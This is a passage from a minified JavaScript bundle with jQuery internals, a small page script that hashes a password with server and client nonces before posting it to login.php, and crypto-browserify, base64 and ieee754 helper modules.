                        1 === this.nodeType && (r = i ? e.call(this, n, Ce(this).val()) : e, null == r ? r = "" : "number" == typeof r ? r += "" : Array.isArray(r) && (r = Ce.map(r, function(e) { return null == e ? "" : e + "" })), (t = Ce.valHooks[this.type] || Ce.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, r, "value") || (this.value = r)) }); if (r) return (t = Ce.valHooks[r.type] || Ce.valHooks[r.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(r, "value")) ? n : (n = r.value, "string" == typeof n ? n.replace(Mt, "") : null == n ? "" : n) } } }), Ce.extend({ valHooks: { option: { get: function(e) { var t = Ce.find.attr(e, "value"); return null != t ? t : ee(Ce.text(e)) } }, select: { get: function(e) { var t, n, i, r = e.options,
                            o = e.selectedIndex,
                            a = "select-one" === e.type,
                            s = a ? null : [],
                            c = a ? o + 1 : r.length; for (i = o < 0 ? c : a ? o : 0; i < c; i++)
                            if (n = r[i], (n.selected || i === o) && !n.disabled && (!n.parentNode.disabled || !u(n.parentNode, "optgroup"))) { if (t = Ce(n).val(), a) return t;
                                s.push(t) }
                        return s }, set: function(e, t) { for (var n, i, r = e.options, o = Ce.makeArray(t), a = r.length; a--;) i = r[a], (i.selected = Ce.inArray(Ce.valHooks.option.get(i), o) > -1) && (n = !0); return n || (e.selectedIndex = -1), o } } } }), Ce.each(["radio", "checkbox"], function() { Ce.valHooks[this] = { set: function(e, t) { if (Array.isArray(t)) return e.checked = Ce.inArray(Ce(e).val(), t) > -1 } }, xe.checkOn || (Ce.valHooks[this].get = function(e) { return null === e.getAttribute("value") ? "on" : e.value }) }), xe.focusin = "onfocusin" in n;
        var Rt = /^(?:focusinfocus|focusoutblur)$/,
            Pt = function(e) { e.stopPropagation() };
        Ce.extend(Ce.event, { trigger: function(e, t, i, r) { var o, a, s, c, u, l, d, f, h = [i || le],
                    p = ve.call(e, "type") ? e.type : e,
                    b = ve.call(e, "namespace") ? e.namespace.split(".") : []; if (a = f = s = i = i || le, 3 !== i.nodeType && 8 !== i.nodeType && !Rt.test(p + Ce.event.triggered) && (p.indexOf(".") > -1 && (b = p.split("."), p = b.shift(), b.sort()), u = p.indexOf(":") < 0 && "on" + p, e = e[Ce.expando] ? e : new Ce.Event(p, "object" == typeof e && e), e.isTrigger = r ? 2 : 3, e.namespace = b.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + b.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = i), t = null == t ? [e] : Ce.makeArray(t, [e]), d = Ce.event.special[p] || {}, r || !d.trigger || !1 !== d.trigger.apply(i, t))) { if (!r && !d.noBubble && !_e(i)) { for (c = d.delegateType || p, Rt.test(c + p) || (a = a.parentNode); a; a = a.parentNode) h.push(a), s = a;
                        s === (i.ownerDocument || le) && h.push(s.defaultView || s.parentWindow || n) } for (o = 0;
                        (a = h[o++]) && !e.isPropagationStopped();) f = a, e.type = o > 1 ? c : d.bindType || p, l = (He.get(a, "events") || {})[e.type] && He.get(a, "handle"), l && l.apply(a, t), (l = u && a[u]) && l.apply && Ue(a) && (e.result = l.apply(a, t), !1 === e.result && e.preventDefault()); return e.type = p, r || e.isDefaultPrevented() || d._default && !1 !== d._default.apply(h.pop(), t) || !Ue(i) || u && Se(i[p]) && !_e(i) && (s = i[u], s && (i[u] = null), Ce.event.triggered = p, e.isPropagationStopped() && f.addEventListener(p, Pt), i[p](), e.isPropagationStopped() && f.removeEventListener(p, Pt), Ce.event.triggered = void 0, s && (i[u] = s)), e.result } }, simulate: function(e, t, n) { var i = Ce.extend(new Ce.Event, n, { type: e, isSimulated: !0 });
                Ce.event.trigger(i, null, t) } }), Ce.fn.extend({ trigger: function(e, t) { return this.each(function() { Ce.event.trigger(e, t, this) }) }, triggerHandler: function(e, t) { var n = this[0]; if (n) return Ce.event.trigger(e, t, n, !0) } }), xe.focusin || Ce.each({ focus: "focusin", blur: "focusout" }, function(e, t) { var n = function(e) { Ce.event.simulate(t, e.target, Ce.event.fix(e)) };
            Ce.event.special[t] = { setup: function() { var i = this.ownerDocument || this,
                        r = He.access(i, t);
                    r || i.addEventListener(e, n, !0), He.access(i, t, (r || 0) + 1) }, teardown: function() { var i = this.ownerDocument || this,
                        r = He.access(i, t) - 1;
                    r ? He.access(i, t, r) : (i.removeEventListener(e, n, !0), He.remove(i, t)) } } });
        var It = n.location,
            Dt = Date.now(),
            Ot = /\?/;
        Ce.parseXML = function(e) { var t; if (!e || "string" != typeof e) return null; try { t = (new n.DOMParser).parseFromString(e, "text/xml") } catch (e) { t = void 0 } return t && !t.getElementsByTagName("parsererror").length || Ce.error("Invalid XML: " + e), t };
        var jt = /\[\]$/,
            qt = /\r?\n/g,
            Bt = /^(?:submit|button|image|reset|file)$/i,
            Lt = /^(?:input|select|textarea|keygen)/i;
        Ce.param = function(e, t) { var n, i = [],
                r = function(e, t) { var n = Se(t) ? t() : t;
                    i[i.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n) }; if (Array.isArray(e) || e.jquery && !Ce.isPlainObject(e)) Ce.each(e, function() { r(this.name, this.value) });
            else
                for (n in e) ie(n, e[n], t, r); return i.join("&") }, Ce.fn.extend({ serialize: function() { return Ce.param(this.serializeArray()) }, serializeArray: function() { return this.map(function() { var e = Ce.prop(this, "elements"); return e ? Ce.makeArray(e) : this }).filter(function() { var e = this.type; return this.name && !Ce(this).is(":disabled") && Lt.test(this.nodeName) && !Bt.test(e) && (this.checked || !Qe.test(e)) }).map(function(e, t) { var n = Ce(this).val(); return null == n ? null : Array.isArray(n) ? Ce.map(n, function(e) { return { name: t.name, value: e.replace(qt, "\r\n") } }) : { name: t.name, value: n.replace(qt, "\r\n") } }).get() } });
        var Nt = /%20/g,
            Ft = /#.*$/,
            zt = /([?&])_=[^&]*/,
            Ut = /^(.*?):[ \t]*([^\r\n]*)$/gm,
            Ht = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
            Vt = /^(?:GET|HEAD)$/,
            Wt = /^\/\//,
            Kt = {},
            Yt = {},
            Xt = "*/".concat("*"),
            $t = le.createElement("a");
        $t.href = It.href, Ce.extend({ active: 0, lastModified: {}, etag: {}, ajaxSettings: { url: It.href, type: "GET", isLocal: Ht.test(It.protocol), global: !0, processData: !0, async: !0, contentType: "application/x-www-form-urlencoded; charset=UTF-8", accepts: { "*": Xt, text: "text/plain", html: "text/html", xml: "application/xml, text/xml", json: "application/json, text/javascript" }, contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ }, responseFields: { xml: "responseXML", text: "responseText", json: "responseJSON" }, converters: { "* text": String, "text html": !0, "text json": JSON.parse, "text xml": Ce.parseXML }, flatOptions: { url: !0, context: !0 } }, ajaxSetup: function(e, t) { return t ? ae(ae(e, Ce.ajaxSettings), t) : ae(Ce.ajaxSettings, e) }, ajaxPrefilter: re(Kt), ajaxTransport: re(Yt), ajax: function(e, t) {
                function i(e, t, i, s) { var u, f, h, w, x, S = t;
                    l || (l = !0, c && n.clearTimeout(c), r = void 0, a = s || "", _.readyState = e > 0 ? 4 : 0, u = e >= 200 && e < 300 || 304 === e, i && (w = se(p, _, i)), w = ce(p, w, _, u), u ? (p.ifModified && (x = _.getResponseHeader("Last-Modified"), x && (Ce.lastModified[o] = x), (x = _.getResponseHeader("etag")) && (Ce.etag[o] = x)), 204 === e || "HEAD" === p.type ? S = "nocontent" : 304 === e ? S = "notmodified" : (S = w.state, f = w.data, h = w.error, u = !h)) : (h = S, !e && S || (S = "error", e < 0 && (e = 0))), _.status = e, _.statusText = (t || S) + "", u ? g.resolveWith(b, [f, S, _]) : g.rejectWith(b, [_, S, h]), _.statusCode(y), y = void 0, d && m.trigger(u ? "ajaxSuccess" : "ajaxError", [_, p, u ? f : h]), v.fireWith(b, [_, S]), d && (m.trigger("ajaxComplete", [_, p]), --Ce.active || Ce.event.trigger("ajaxStop"))) } "object" == typeof e && (t = e, e = void 0), t = t || {}; var r, o, a, s, c, u, l, d, f, h, p = Ce.ajaxSetup({}, t),
                    b = p.context || p,
                    m = p.context && (b.nodeType || b.jquery) ? Ce(b) : Ce.event,
                    g = Ce.Deferred(),
                    v = Ce.Callbacks("once memory"),
                    y = p.statusCode || {},
                    w = {},
                    x = {},
                    S = "canceled",
                    _ = { readyState: 0, getResponseHeader: function(e) { var t; if (l) { if (!s)
                                    for (s = {}; t = Ut.exec(a);) s[t[1].toLowerCase()] = t[2];
                                t = s[e.toLowerCase()] } return null == t ? null : t }, getAllResponseHeaders: function() { return l ? a : null }, setRequestHeader: function(e, t) { return null == l && (e = x[e.toLowerCase()] = x[e.toLowerCase()] || e, w[e] = t), this }, overrideMimeType: function(e) { return null == l && (p.mimeType = e), this }, statusCode: function(e) { var t; if (e)
                                if (l) _.always(e[_.status]);
                                else
                                    for (t in e) y[t] = [y[t], e[t]]; return this }, abort: function(e) { var t = e || S; return r && r.abort(t), i(0, t), this } }; if (g.promise(_), p.url = ((e || p.url || It.href) + "").replace(Wt, It.protocol + "//"), p.type = t.method || t.type || p.method || p.type, p.dataTypes = (p.dataType || "*").toLowerCase().match(qe) || [""], null == p.crossDomain) { u = le.createElement("a"); try { u.href = p.url, u.href = u.href, p.crossDomain = $t.protocol + "//" + $t.host != u.protocol + "//" + u.host } catch (e) { p.crossDomain = !0 } } if (p.data && p.processData && "string" != typeof p.data && (p.data = Ce.param(p.data, p.traditional)), oe(Kt, p, t, _), l) return _;
                d = Ce.event && p.global, d && 0 == Ce.active++ && Ce.event.trigger("ajaxStart"), p.type = p.type.toUpperCase(), p.hasContent = !Vt.test(p.type), o = p.url.replace(Ft, ""), p.hasContent ? p.data && p.processData && 0 === (p.contentType || "").indexOf("application/x-www-form-urlencoded") && (p.data = p.data.replace(Nt, "+")) : (h = p.url.slice(o.length), p.data && (p.processData || "string" == typeof p.data) && (o += (Ot.test(o) ? "&" : "?") + p.data, delete p.data), !1 === p.cache && (o = o.replace(zt, "$1"), h = (Ot.test(o) ? "&" : "?") + "_=" + Dt++ + h), p.url = o + h), p.ifModified && (Ce.lastModified[o] && _.setRequestHeader("If-Modified-Since", Ce.lastModified[o]), Ce.etag[o] && _.setRequestHeader("If-None-Match", Ce.etag[o])), (p.data && p.hasContent && !1 !== p.contentType || t.contentType) && _.setRequestHeader("Content-Type", p.contentType), _.setRequestHeader("Accept", p.dataTypes[0] && p.accepts[p.dataTypes[0]] ? p.accepts[p.dataTypes[0]] + ("*" !== p.dataTypes[0] ? ", " + Xt + "; q=0.01" : "") : p.accepts["*"]); for (f in p.headers) _.setRequestHeader(f, p.headers[f]); if (p.beforeSend && (!1 === p.beforeSend.call(b, _, p) || l)) return _.abort(); if (S = "abort", v.add(p.complete), _.done(p.success), _.fail(p.error), r = oe(Yt, p, t, _)) { if (_.readyState = 1, d && m.trigger("ajaxSend", [_, p]), l) return _;
                    p.async && p.timeout > 0 && (c = n.setTimeout(function() { _.abort("timeout") }, p.timeout)); try { l = !1, r.send(w, i) } catch (e) { if (l) throw e;
                        i(-1, e) } } else i(-1, "No Transport"); return _ }, getJSON: function(e, t, n) { return Ce.get(e, t, n, "json") }, getScript: function(e, t) { return Ce.get(e, void 0, t, "script") } }), Ce.each(["get", "post"], function(e, t) { Ce[t] = function(e, n, i, r) { return Se(n) && (r = r || i, i = n, n = void 0), Ce.ajax(Ce.extend({ url: e, type: t, dataType: r, data: n, success: i }, Ce.isPlainObject(e) && e)) } }), Ce._evalUrl = function(e) { return Ce.ajax({ url: e, type: "GET", dataType: "script", cache: !0, async: !1, global: !1, throws: !0 }) }, Ce.fn.extend({ wrapAll: function(e) { var t; return this[0] && (Se(e) && (e = e.call(this[0])), t = Ce(e, this[0].ownerDocument).eq(0).clone(!0), this[0].parentNode && t.insertBefore(this[0]), t.map(function() { for (var e = this; e.firstElementChild;) e = e.firstElementChild; return e }).append(this)), this }, wrapInner: function(e) { return Se(e) ? this.each(function(t) { Ce(this).wrapInner(e.call(this, t)) }) : this.each(function() { var t = Ce(this),
                        n = t.contents();
                    n.length ? n.wrapAll(e) : t.append(e) }) }, wrap: function(e) { var t = Se(e); return this.each(function(n) { Ce(this).wrapAll(t ? e.call(this, n) : e) }) }, unwrap: function(e) { return this.parent(e).not("body").each(function() { Ce(this).replaceWith(this.childNodes) }), this } }), Ce.expr.pseudos.hidden = function(e) { return !Ce.expr.pseudos.visible(e) }, Ce.expr.pseudos.visible = function(e) { return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length) }, Ce.ajaxSettings.xhr = function() { try { return new n.XMLHttpRequest } catch (e) {} };
        var Gt = { 0: 200, 1223: 204 },
            Jt = Ce.ajaxSettings.xhr();
        xe.cors = !!Jt && "withCredentials" in Jt, xe.ajax = Jt = !!Jt, Ce.ajaxTransport(function(e) { var t, i; if (xe.cors || Jt && !e.crossDomain) return { send: function(r, o) { var a, s = e.xhr(); if (s.open(e.type, e.url, e.async, e.username, e.password), e.xhrFields)
                        for (a in e.xhrFields) s[a] = e.xhrFields[a];
                    e.mimeType && s.overrideMimeType && s.overrideMimeType(e.mimeType), e.crossDomain || r["X-Requested-With"] || (r["X-Requested-With"] = "XMLHttpRequest"); for (a in r) s.setRequestHeader(a, r[a]);
                    t = function(e) { return function() { t && (t = i = s.onload = s.onerror = s.onabort = s.ontimeout = s.onreadystatechange = null, "abort" === e ? s.abort() : "error" === e ? "number" != typeof s.status ? o(0, "error") : o(s.status, s.statusText) : o(Gt[s.status] || s.status, s.statusText, "text" !== (s.responseType || "text") || "string" != typeof s.responseText ? { binary: s.response } : { text: s.responseText }, s.getAllResponseHeaders())) } }, s.onload = t(), i = s.onerror = s.ontimeout = t("error"), void 0 !== s.onabort ? s.onabort = i : s.onreadystatechange = function() { 4 === s.readyState && n.setTimeout(function() { t && i() }) }, t = t("abort"); try { s.send(e.hasContent && e.data || null) } catch (e) { if (t) throw e } }, abort: function() { t && t() } } }), Ce.ajaxPrefilter(function(e) { e.crossDomain && (e.contents.script = !1) }), Ce.ajaxSetup({ accepts: { script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript" }, contents: { script: /\b(?:java|ecma)script\b/ }, converters: { "text script": function(e) { return Ce.globalEval(e), e } } }), Ce.ajaxPrefilter("script", function(e) { void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET") }), Ce.ajaxTransport("script", function(e) { if (e.crossDomain) { var t, n; return { send: function(i, r) { t = Ce("<script>").prop({ charset: e.scriptCharset, src: e.url }).on("load error", n = function(e) { t.remove(), n = null, e && r("error" === e.type ? 404 : 200, e.type) }), le.head.appendChild(t[0]) }, abort: function() { n && n() } } } });
        var Zt = [],
            Qt = /(=)\?(?=&|$)|\?\?/;
        Ce.ajaxSetup({ jsonp: "callback", jsonpCallback: function() { var e = Zt.pop() || Ce.expando + "_" + Dt++; return this[e] = !0, e } }), Ce.ajaxPrefilter("json jsonp", function(e, t, i) { var r, o, a, s = !1 !== e.jsonp && (Qt.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && Qt.test(e.data) && "data"); if (s || "jsonp" === e.dataTypes[0]) return r = e.jsonpCallback = Se(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, s ? e[s] = e[s].replace(Qt, "$1" + r) : !1 !== e.jsonp && (e.url += (Ot.test(e.url) ? "&" : "?") + e.jsonp + "=" + r), e.converters["script json"] = function() { return a || Ce.error(r + " was not called"), a[0] }, e.dataTypes[0] = "json", o = n[r], n[r] = function() { a = arguments }, i.always(function() { void 0 === o ? Ce(n).removeProp(r) : n[r] = o, e[r] && (e.jsonpCallback = t.jsonpCallback, Zt.push(r)), a && Se(o) && o(a[0]), a = o = void 0 }), "script" }), xe.createHTMLDocument = function() { var e = le.implementation.createHTMLDocument("").body; return e.innerHTML = "<form></form><form></form>", 2 === e.childNodes.length }(), Ce.parseHTML = function(e, t, n) { if ("string" != typeof e) return []; "boolean" == typeof t && (n = t, t = !1); var i, r, o; return t || (xe.createHTMLDocument ? (t = le.implementation.createHTMLDocument(""), i = t.createElement("base"), i.href = le.location.href, t.head.appendChild(i)) : t = le), r = Pe.exec(e), o = !n && [], r ? [t.createElement(r[1])] : (r = E([e], t, o), o && o.length && Ce(o).remove(), Ce.merge([], r.childNodes)) }, Ce.fn.load = function(e, t, n) { var i, r, o, a = this,
                s = e.indexOf(" "); return s > -1 && (i = ee(e.slice(s)), e = e.slice(0, s)), Se(t) ? (n = t, t = void 0) : t && "object" == typeof t && (r = "POST"), a.length > 0 && Ce.ajax({ url: e, type: r || "GET", dataType: "html", data: t }).done(function(e) { o = arguments, a.html(i ? Ce("<div>").append(Ce.parseHTML(e)).find(i) : e) }).always(n && function(e, t) { a.each(function() { n.apply(this, o || [e.responseText, t, e]) }) }), this }, Ce.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) { Ce.fn[t] = function(e) { return this.on(t, e) } }), Ce.expr.pseudos.animated = function(e) { return Ce.grep(Ce.timers, function(t) { return e === t.elem }).length }, Ce.offset = { setOffset: function(e, t, n) { var i, r, o, a, s, c, u, l = Ce.css(e, "position"),
                    d = Ce(e),
                    f = {}; "static" === l && (e.style.position = "relative"), s = d.offset(), o = Ce.css(e, "top"), c = Ce.css(e, "left"), u = ("absolute" === l || "fixed" === l) && (o + c).indexOf("auto") > -1, u ? (i = d.position(), a = i.top, r = i.left) : (a = parseFloat(o) || 0, r = parseFloat(c) || 0), Se(t) && (t = t.call(e, n, Ce.extend({}, s))), null != t.top && (f.top = t.top - s.top + a), null != t.left && (f.left = t.left - s.left + r), "using" in t ? t.using.call(e, f) : d.css(f) } }, Ce.fn.extend({ offset: function(e) { if (arguments.length) return void 0 === e ? this : this.each(function(t) { Ce.offset.setOffset(this, e, t) }); var t, n, i = this[0]; if (i) return i.getClientRects().length ? (t = i.getBoundingClientRect(), n = i.ownerDocument.defaultView, { top: t.top + n.pageYOffset, left: t.left + n.pageXOffset }) : { top: 0, left: 0 } }, position: function() { if (this[0]) { var e, t, n, i = this[0],
                        r = { top: 0, left: 0 }; if ("fixed" === Ce.css(i, "position")) t = i.getBoundingClientRect();
                    else { for (t = this.offset(), n = i.ownerDocument, e = i.offsetParent || n.documentElement; e && (e === n.body || e === n.documentElement) && "static" === Ce.css(e, "position");) e = e.parentNode;
                        e && e !== i && 1 === e.nodeType && (r = Ce(e).offset(), r.top += Ce.css(e, "borderTopWidth", !0), r.left += Ce.css(e, "borderLeftWidth", !0)) } return { top: t.top - r.top - Ce.css(i, "marginTop", !0), left: t.left - r.left - Ce.css(i, "marginLeft", !0) } } }, offsetParent: function() { return this.map(function() { for (var e = this.offsetParent; e && "static" === Ce.css(e, "position");) e = e.offsetParent; return e || rt }) } }), Ce.each({ scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function(e, t) { var n = "pageYOffset" === t;
            Ce.fn[e] = function(i) { return Ne(this, function(e, i, r) { var o; if (_e(e) ? o = e : 9 === e.nodeType && (o = e.defaultView), void 0 === r) return o ? o[t] : e[i];
                    o ? o.scrollTo(n ? o.pageXOffset : r, n ? r : o.pageYOffset) : e[i] = r }, e, i, arguments.length) } }), Ce.each(["top", "left"], function(e, t) { Ce.cssHooks[t] = F(xe.pixelPosition, function(e, n) { if (n) return n = N(e, t), ft.test(n) ? Ce(e).position()[t] + "px" : n }) }), Ce.each({ Height: "height", Width: "width" }, function(e, t) { Ce.each({ padding: "inner" + e, content: t, "": "outer" + e }, function(n, i) { Ce.fn[i] = function(r, o) { var a = arguments.length && (n || "boolean" != typeof r),
                        s = n || (!0 === r || !0 === o ? "margin" : "border"); return Ne(this, function(t, n, r) { var o; return _e(t) ? 0 === i.indexOf("outer") ? t["inner" + e] : t.document.documentElement["client" + e] : 9 === t.nodeType ? (o = t.documentElement, Math.max(t.body["scroll" + e], o["scroll" + e], t.body["offset" + e], o["offset" + e], o["client" + e])) : void 0 === r ? Ce.css(t, n, s) : Ce.style(t, n, r, s) }, t, a ? r : void 0, a) } }) }), Ce.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function(e, t) { Ce.fn[t] = function(e, n) { return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t) } }), Ce.fn.extend({ hover: function(e, t) { return this.mouseenter(e).mouseleave(t || e) } }), Ce.fn.extend({ bind: function(e, t, n) { return this.on(e, null, t, n) }, unbind: function(e, t) { return this.off(e, null, t) }, delegate: function(e, t, n, i) { return this.on(t, e, n, i) }, undelegate: function(e, t, n) { return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n) } }), Ce.proxy = function(e, t) { var n, i, r; if ("string" == typeof t && (n = e[t], t = e, e = n), Se(e)) return i = fe.call(arguments, 2), r = function() { return e.apply(t || this, i.concat(fe.call(arguments))) }, r.guid = e.guid = e.guid || Ce.guid++, r }, Ce.holdReady = function(e) { e ? Ce.readyWait++ : Ce.ready(!0) }, Ce.isArray = Array.isArray, Ce.parseJSON = JSON.parse, Ce.nodeName = u, Ce.isFunction = Se, Ce.isWindow = _e, Ce.camelCase = v, Ce.type = s, Ce.now = Date.now, Ce.isNumeric = function(e) { var t = Ce.type(e); return ("number" === t || "string" === t) && !isNaN(e - parseFloat(e)) }, i = [], void 0 !== (r = function() { return Ce }.apply(t, i)) && (e.exports = r);
        var en = n.jQuery,
            tn = n.$;
        return Ce.noConflict = function(e) { return n.$ === Ce && (n.$ = tn), e && n.jQuery === Ce && (n.jQuery = en), Ce }, o || (n.jQuery = n.$ = Ce), Ce
    })
}, function(e, t, n) { "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
        function(e, t) {
            function i(t) { return e.createHash("sha256").update(t).digest("hex") } var r = n(162);
            n.n(r);
            t(function() { 
                t("#submit").on("click", function() { var e = t("input#username").val(),
                n = t("input#password").val(),
                r = t("input#nonce").val(),
                o = Math.random() + "",
                a = i(i(n) + ":" + r + ":" + o); 
                return t.post("login.php", { username: e, cnonce: o, hash: a }, 
                    function(e) { e.error ? t("input#nonce").val(e.nonce) : location.reload(!0) }), !1 }) 
            }) 
        }.call(t, n(72), n(70))
    }, 

            function(e, t, n) { "use strict";
    t.randomBytes = t.rng = t.pseudoRandomBytes = t.prng = n(11), t.createHash = t.Hash = n(13), t.createHmac = t.Hmac = n(44); var i = n(92),
        r = Object.keys(i),
        o = ["sha1", "sha224", "sha256", "sha384", "sha512", "md5", "rmd160"].concat(r);
    t.getHashes = function() { return o }; var a = n(46);
    t.pbkdf2 = a.pbkdf2, t.pbkdf2Sync = a.pbkdf2Sync; var s = n(94);
    t.Cipher = s.Cipher, t.createCipher = s.createCipher, t.Cipheriv = s.Cipheriv, t.createCipheriv = s.createCipheriv, t.Decipher = s.Decipher, t.createDecipher = s.createDecipher, t.Decipheriv = s.Decipheriv, t.createDecipheriv = s.createDecipheriv, t.getCiphers = s.getCiphers, t.listCiphers = s.listCiphers; var c = n(113);
    t.DiffieHellmanGroup = c.DiffieHellmanGroup, t.createDiffieHellmanGroup = c.createDiffieHellmanGroup, t.getDiffieHellman = c.getDiffieHellman, t.createDiffieHellman = c.createDiffieHellman, t.DiffieHellman = c.DiffieHellman; var u = n(119);
    t.createSign = u.createSign, t.Sign = u.Sign, t.createVerify = u.createVerify, t.Verify = u.Verify, t.createECDH = n(157); var l = n(158);
    t.publicEncrypt = l.publicEncrypt, t.privateEncrypt = l.privateEncrypt, t.publicDecrypt = l.publicDecrypt, t.privateDecrypt = l.privateDecrypt; var d = n(161);
    t.randomFill = d.randomFill, t.randomFillSync = d.randomFillSync, t.createCredentials = function() { throw new Error(["sorry, createCredentials is not implemented yet", "we accept pull requests", "https://github.com/crypto-browserify/crypto-browserify"].join("\n")) }, t.constants = { DH_CHECK_P_NOT_SAFE_PRIME: 2, DH_CHECK_P_NOT_PRIME: 1, DH_UNABLE_TO_CHECK_GENERATOR: 4, DH_NOT_SUITABLE_GENERATOR: 8, NPN_ENABLED: 1, ALPN_ENABLED: 1, RSA_PKCS1_PADDING: 1, RSA_SSLV23_PADDING: 2, RSA_NO_PADDING: 3, RSA_PKCS1_OAEP_PADDING: 4, RSA_X931_PADDING: 5, RSA_PKCS1_PSS_PADDING: 6, POINT_CONVERSION_COMPRESSED: 2, POINT_CONVERSION_UNCOMPRESSED: 4, POINT_CONVERSION_HYBRID: 6 } }, function(e, t, n) { "use strict";

    function i(e) { var t = e.length; if (t % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4"); return "=" === e[t - 2] ? 2 : "=" === e[t - 1] ? 1 : 0 }

    function r(e) { return 3 * e.length / 4 - i(e) }

    function o(e) { var t, n, r, o, a, s = e.length;
        o = i(e), a = new d(3 * s / 4 - o), n = o > 0 ? s - 4 : s; var c = 0; for (t = 0; t < n; t += 4) r = l[e.charCodeAt(t)] << 18 | l[e.charCodeAt(t + 1)] << 12 | l[e.charCodeAt(t + 2)] << 6 | l[e.charCodeAt(t + 3)], a[c++] = r >> 16 & 255, a[c++] = r >> 8 & 255, a[c++] = 255 & r; return 2 === o ? (r = l[e.charCodeAt(t)] << 2 | l[e.charCodeAt(t + 1)] >> 4, a[c++] = 255 & r) : 1 === o && (r = l[e.charCodeAt(t)] << 10 | l[e.charCodeAt(t + 1)] << 4 | l[e.charCodeAt(t + 2)] >> 2, a[c++] = r >> 8 & 255, a[c++] = 255 & r), a }

    function a(e) { return u[e >> 18 & 63] + u[e >> 12 & 63] + u[e >> 6 & 63] + u[63 & e] }

    function s(e, t, n) { for (var i, r = [], o = t; o < n; o += 3) i = (e[o] << 16) + (e[o + 1] << 8) + e[o + 2], r.push(a(i)); return r.join("") }

    function c(e) { for (var t, n = e.length, i = n % 3, r = "", o = [], a = 0, c = n - i; a < c; a += 16383) o.push(s(e, a, a + 16383 > c ? c : a + 16383)); return 1 === i ? (t = e[n - 1], r += u[t >> 2], r += u[t << 4 & 63], r += "==") : 2 === i && (t = (e[n - 2] << 8) + e[n - 1], r += u[t >> 10], r += u[t >> 4 & 63], r += u[t << 2 & 63], r += "="), o.push(r), o.join("") } t.byteLength = r, t.toByteArray = o, t.fromByteArray = c; for (var u = [], l = [], d = "undefined" != typeof Uint8Array ? Uint8Array : Array, f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", h = 0, p = f.length; h < p; ++h) u[h] = f[h], l[f.charCodeAt(h)] = h;
    l["-".charCodeAt(0)] = 62, l["_".charCodeAt(0)] = 63 }, function(e, t) { t.read = function(e, t, n, i, r) { var o, a, s = 8 * r - i - 1,
            c = (1 << s) - 1,
            u = c >> 1,
            l = -7,
            d = n ? r - 1 : 0,
            f = n ? -1 : 1,
            h = e[t + d]; for (d += f, o = h & (1 << -l) - 1, h >>= -l, l += s; l > 0; o = 256 * o + e[t + d], d += f, l -= 8); for (a = o & (1 << -l) - 1, o >>= -l, l += i; l > 0; a = 256 * a + e[t + d], d += f, l -= 8); if (0 === o) o = 1 - u;
        else { if (o === c) return a ? NaN : 1 / 0 * (h ? -1 : 1);
            a += Math.pow(2, i), o -= u } return (h ? -1 : 1) * a * Math.pow(2, o - i) }, t.write = function(e, t, n, i, r, o) { var a, s, c, u = 8 * o - r - 1,
            l = (1 << u) - 1,
            d = l >> 1,
            f = 23 === r ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
            h = i ? 0 : o - 1,
            p = i ? 1 : -1,
            b = t < 0 || 0 === t && 1 / t < 0 ? 1 : 0; for (t = Math.abs(t), isNaN(t) || t === 1 / 0 ? (s = isNaN(t) ? 1 : 0, a = l) : (a = Math.floor(Math.log(t) / Math.LN2), t * (c = Math.pow(2, -a)) < 1 && (a--, c *= 2), t += a + d >= 1 ? f / c : f * Math.pow(2, 1 - d), t * c >= 2 && (a++, c /= 2), a + d >= l ? (s = 0, a = l) : a + d >= 1 ? (s = (t * c - 1) * Math.pow(2, r), a += d) : (s = t * Math.pow(2, d - 1) * Math.pow(2, r), a = 0)); r >= 8; e[n + h] = 255 & s, h += p, s /= 256, r -= 8); for (a = a << r | s, u += r; u > 0; e[n + h] = 255 & a, h += p, a /= 256, u -= 8);
        e[n + h - p] |= 128 * b } }, function(e, t, n) { "use strict";
    (function(t) {
        function n(e) { if (e.length % i != 0) { var n = e.length + (i - e.length % i);
                e = t.concat([e, r], n) } for (var o = new Array(e.length >>> 2), a = 0, s = 0; a < e.length; a += i, s++) o[s] = e.readInt32LE(a); return o } var i = 4,
            r = new t(i);
        r.fill(0);
        e.exports = function(e, i) { var r = i(n(e), 8 * e.length);
            e = new t(16); for (var o = 0; o < r.length; o++) e.writeInt32LE(r[o], o << 2, !0); return e } }).call(t, n(2).Buffer) }, function(e, t, n) { "use strict";
    (function(t) {
        function i(e) { r.call(this), this._block = new t(e), this._blockSize = e, this._blockOffset = 0, this._length = [0, 0, 0, 0], this._finalized = !1 } var r = n(19).Transform;
        n(0)(i, r), i.prototype._transform = function(e, n, i) { var r = null; try { "buffer" !== n && (e = new t(e, n)), this.update(e) } catch (e) { r = e } i(r) }, i.prototype._flush = function(e) { var t = null; try { this.push(this._digest()) } catch (e) { t = e } e(t) }, i.prototype.update = function(e, n) { if (!t.isBuffer(e) && "string" != typeof e) throw new TypeError("Data must be a string or a buffer"); if (this._finalized) throw new Error("Digest already called");
            t.isBuffer(e) || (e = new t(e, n || "binary")); for (var i = this._block, r = 0; this._blockOffset + e.length - r >= this._blockSize;) { for (var o = this._blockOffset; o < this._blockSize;) i[o++] = e[r++];
